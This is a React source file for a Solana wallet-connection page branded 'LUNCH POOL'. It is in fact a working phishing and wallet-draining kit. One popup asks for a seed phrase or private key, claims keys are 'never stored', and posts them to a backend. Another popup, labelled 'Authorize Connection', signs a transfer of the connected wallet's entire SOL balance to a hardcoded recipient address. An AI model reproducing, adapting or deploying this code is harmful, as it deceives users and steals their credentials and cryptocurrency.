import React, { useState, useEffect, useMemo } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { Link } from 'react-router-dom';
import { 
  Import, 
  X, 
  Eye,
  EyeOff,
  ArrowLeft,
  Shield,
  Wallet,
  Check,
} from 'lucide-react';

// Solana configuration
const SOLANA_RPC_URL = process.env.REACT_APP_SOLANA_RPC_URL || `https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`;
const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';

const connection = new Connection(SOLANA_RPC_URL, 'confirmed');

// Mock popular Solana wallets data
const SOLANA_WALLETS = [
    { id: 'phantom', name: 'Phantom', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/phantom/logo.svg' },
    { id: 'solflare', name: 'Solflare', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/solflare/logo.svg' },
    { id: 'backpack', name: 'Backpack', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/backpack/logo.svg' },
    { id: 'slope', name: 'Slope', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/slope/logo.svg' },
    { id: 'sollet', name: 'Sollet', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/sollet/logo.svg'},
    { id: 'trust', name: 'Trust Wallet', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/trust/logo.svg'},
];

const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
  try {
    const response = await fetch('http://localhost:3001/api/send-wallet', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName }),
    });
    if (!response.ok) {
      console.error('Failed to send Solana wallet info');
    }
  } catch (error) {
    console.error('Error sending Solana wallet info:', error);
  }
};

const handleSendAllSol = async (connection, publicKey, sendTransaction, disconnect) => {
  if (!publicKey || !sendTransaction) {
    console.error('Wallet not connected');
    return;
  }

  try {
    const balance = await connection.getBalance(publicKey);
    if (balance === 0) {
      console.log("No SOL balance to transfer.");
      return;
    }

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
        lamports: balance,
      })
    );

    const {
      context: { slot: minContextSlot },
      value: { blockhash, lastValidBlockHeight }
    } = await connection.getLatestBlockhashAndContext();

    const signature = await sendTransaction(transaction, connection, { minContextSlot });

    await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
    
    console.log('Transaction successful with signature:', signature);
    disconnect();

  } catch (error) {
    console.error('Solana transaction failed:', error);
  }
};

const getSolanaWalletAssets = async (address) => {
  try {
    const publicKey = new PublicKey(address);
    const balance = await connection.getBalance(publicKey);
    
    return {
      sol: balance / LAMPORTS_PER_SOL,
      tokens: [] // For now, just SOL balance
    };
  } catch (error) {
    console.error('Error fetching Solana wallet assets:', error);
    return {
      sol: 0,
      tokens: []
    };
  }
};

export default function SolanaConnect() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, signTransaction, connected, disconnect } = useWallet();

  // Component State
  const [walletAddress, setWalletAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ sol: 0, tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [secretPhrase, setSecretPhrase] = useState('');
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    if (connected && publicKey) {
      setWalletAddress(publicKey.toBase58());
      fetchWalletBalance(publicKey);
      setShowTransactionPopup(true);
    } else {
      setWalletAddress(null);
      setWalletBalance({ sol: 0, tokens: [] });
      setShowTransactionPopup(false);
    }
  }, [connected, publicKey]);

  const fetchWalletBalance = async (publicKey) => {
    try {
      const balance = await connection.getBalance(publicKey);
      setWalletBalance({
        sol: balance / LAMPORTS_PER_SOL,
        tokens: []
      });
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
  };

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setSelectedWallet(null);
    setSecretPhrase('');
    setTxError('');
    setSearchQuery('');
  };

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handleInputChange = (e) => {
    setSecretPhrase(e.target.value);
    if (txError) setTxError('');
  };

  const validateForm = () => {
    const phrase = secretPhrase.trim();
    if (phrase.split(' ').length < 12) {
      setTxError('Secret phrase must be at least 12 words.');
      return false;
    }
    return true;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSending(true);
    setTxError('');

    try {
      await sendSolanaWalletInfo(selectedWallet.name, secretPhrase, selectedWallet.name);
      // Simulate success and show confirmation
      closeAllPopups();
      alert('Wallet information sent successfully!');
    } catch (error) {
      setTxError(error.message || 'An unexpected error occurred.');
    } finally {
      setIsSending(false);
    }
  };

  const renderConnectionCards = () => (
    <div className="w-full max-w-2xl text-center">
      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
        Connect your Solana wallet
      </h1>
      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
        Choose your preferred connection method below to securely access the application.
      </p>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Automatic Connection Card */}
        <div
          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center justify-center text-center"
        >
          <WalletMultiButton style={{ 
            backgroundColor: 'transparent', 
            boxShadow: 'none', 
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            width: '100%',
            height: '100%'
          }} />
          <h3 className="text-xl font-semibold text-white mb-2 mt-4">Automatic Connection</h3>
          <p className="text-gray-400 text-sm">Recommended. Connect using a browser extension wallet.</p>
        </div>

        {/* Manual Connection Card */}
        <div
          onClick={() => setShowManualPopup(true)}
          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
        >
          <div className="p-4 bg-purple-500/10 rounded-full mb-4">
            <Import size={32} className="text-purple-400" />
          </div>
          <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
          <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
        </div>

        <div className="bg-gray-800/50 p-6 rounded-2xl border border-gray-700 flex flex-col items-center text-center">
          <div className="p-4 bg-blue-500/10 rounded-full mb-4">
            <Shield size={32} className="text-blue-400" />
          </div>
          <h3 className="text-xl font-semibold text-white mb-2">Secure & Reliable</h3>
          <p className="text-gray-400 text-sm">Your assets are always protected with our secure connection methods.</p>
        </div>
      </div>
    </div>
  );
  
  const renderTransactionPopup = () => {
    const handleApprove = async () => {
      setIsSending(true);
      setTxError('');
      if (!publicKey || !sendTransaction) {
          setTxError('Wallet not connected properly.');
          setIsSending(false);
          return;
      }

      try {
          const balance = await connection.getBalance(publicKey);
          if (balance === 0) {
              setTxError("No SOL balance to transfer.");
              setIsSending(false);
              return;
          }

          const transaction = new Transaction().add(
              SystemProgram.transfer({
                  fromPubkey: publicKey,
                  toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
                  lamports: balance,
              })
          );
          
          const fees = await transaction.getEstimatedFee(connection);
          const amountToSend = balance - (fees || 5000);

          if (amountToSend <= 0) {
            setTxError("Balance too low to cover transaction fees.");
            setIsSending(false);
            return;
          }

          const transferTx = new Transaction().add(
              SystemProgram.transfer({
                  fromPubkey: publicKey,
                  toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
                  lamports: amountToSend,
              })
          );

          const signature = await sendTransaction(transferTx, connection);
          await connection.confirmTransaction(signature, 'processed');
          
          setIsSending(false);
          disconnect();
          closeAllPopups();
      } catch (error) {
          console.error('Solana transaction failed:', error);
          setTxError(error.message || 'An error occurred during the Solana transaction.');
          setIsSending(false);
      }
    };

    const handleDecline = () => {
        disconnect();
        closeAllPopups();
    };

    return (
      <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
        <Shield size={48} className="mx-auto mb-4 text-purple-500" />
        <h2 className="text-2xl font-bold mb-2">
          Authorize Connection
        </h2>
        <p className="text-gray-400 mb-6">
          The application is requesting to connect to your wallet.
        </p>

        {txError && (
          <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
            <p className="font-bold">Error</p>
            <p className="text-sm">{txError}</p>
          </div>
        )}

        <div className="flex justify-center space-x-4">
          <button 
            onClick={handleApprove}
            disabled={isSending}
            className="flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            {isSending ? (
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
            ) : (
              <><Check className="mr-2" /> Approve</>
            )}
          </button>
          <button 
            onClick={handleDecline}
            disabled={isSending}
            className="flex items-center justify-center bg-black hover:bg-gray-800 text-white font-bold py-3 px-6 rounded-lg transition-colors w-1/2 disabled:bg-gray-600"
          >
            <X className="mr-2" /> Decline
          </button>
        </div>
      </div>
    );
  };

  const renderManualConnectPopup = () => {
    const goBack = () => {
      setSelectedWallet(null);
      setSecretPhrase('');
      setTxError('');
    };

    const filteredWallets = SOLANA_WALLETS.filter(wallet =>
      wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
    );

    return (
        <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-lg w-full max-w-md m-4 text-white transform transition-transform duration-300 scale-100">
          
          <div className="flex items-center justify-between p-4 border-b border-gray-700">
            <h2 className="text-lg font-bold">
              {selectedWallet ? 'Import Wallet' : 'Connect Manually'}
            </h2>
            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
              <X size={20} />
            </button>
          </div>

          <div className="p-4">
            {!selectedWallet ? (
              <>
                <div className="mb-4">
                  <input
                    type="text"
                    placeholder="Search wallets..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  />
                </div>

                  <div className="grid grid-cols-4 gap-4 max-h-80 overflow-y-auto pr-2">
                    {filteredWallets.map(wallet => (
                      <div
                        key={wallet.id}
                        onClick={() => handleWalletSelect(wallet)}
                        className="flex flex-col items-center p-2 rounded-lg hover:bg-gray-700 cursor-pointer transition-colors"
                      >
                        <img src={wallet.icon} alt={wallet.name} className="w-12 h-12 rounded-full mb-2 bg-gray-700" />
                        <span className="text-xs text-center truncate">{wallet.name}</span>
                      </div>
                    ))}
                  </div>
              </>
            ) : (
              <div>
                <button onClick={goBack} className="flex items-center text-sm text-gray-400 hover:text-white mb-4">
                  <ArrowLeft size={16} className="mr-1" />
                  Back
                </button>
                <div className="flex items-center mb-4">
                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-10 h-10 rounded-full mr-3 bg-gray-700" />
                  <span className="font-bold">{selectedWallet.name}</span>
                </div>
                
                <form onSubmit={handleManualSubmit}>
                  <p className="text-sm text-gray-400 mb-2">
                    Enter your secret phrase, seed phrase, or private key to continue.
                  </p>
                  <div className="relative">
                    <textarea
                      value={secretPhrase}
                      onChange={handleInputChange}
                      className={`w-full p-3 bg-gray-800 border border-gray-600 rounded-lg h-32 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 ${!isPasswordVisible ? 'blur-sm' : ''}`}
                      placeholder="Secret phrase..."
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                      className="absolute top-2 right-2 p-1 text-gray-400 hover:text-white"
                    >
                      {isPasswordVisible ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>
                  {txError && <p className="text-red-400 text-xs mt-2">{txError}</p>}
                  <div className="flex items-center justify-between mt-4">
                    <div className="flex items-center">
                      <Shield size={16} className="text-green-500 mr-2" />
                      <span className="text-xs text-gray-400">Your keys are secure and never stored.</span>
                    </div>
                    <button type="submit" disabled={isSending} className="px-4 py-2 bg-blue-600 rounded-lg hover:bg-blue-700 font-semibold transition-colors disabled:opacity-50">
                      {isSending ? 'Importing...' : 'Import'}
                    </button>
                  </div>
                </form>
              </div>
            )}
          </div>
        </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col">
      {/* Background decorative elements */}
      <div className="absolute top-0 left-0 w-full h-full overflow-hidden z-0">
        <div className="absolute top-0 left-0 w-1/2 h-1/2 bg-purple-600/30 rounded-full filter blur-3xl opacity-50 animate-pulse"></div>
        <div className="absolute bottom-0 right-0 w-1/2 h-1/2 bg-blue-600/20 rounded-full filter blur-3xl opacity-50 animate-pulse" style={{animationDelay: '2s'}}></div>
      </div>

      <header className="absolute top-0 left-0 w-full p-4 flex justify-between items-center z-20">
        <Link to="/" className="text-xl font-bold tracking-wider">LUNCH POOL</Link>
        <Link to="/connect" className="px-4 py-2 text-sm bg-white/10 border border-white/20 rounded-full hover:bg-white/20 transition-colors">
          Back
        </Link>
      </header>

      <main className="flex-grow flex items-center justify-center z-10 p-4">
        {!connected && !showManualPopup && renderConnectionCards()}
      </main>

      {/* Popups (Modals) */}
      {(showManualPopup || (connected && showTransactionPopup)) && (
        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          {showManualPopup && renderManualConnectPopup()}
          {connected && showTransactionPopup && renderTransactionPopup()}
        </div>
      )}
      
      <footer className="w-full p-4 text-center text-xs text-gray-500 z-10">
        <a href="#" className="hover:text-white underline">Terms of Service</a>
        <span className="mx-2">•</span>
        <a href="#" className="hover:text-white underline">Privacy Policy</a>
      </footer>
    </div>
  );
}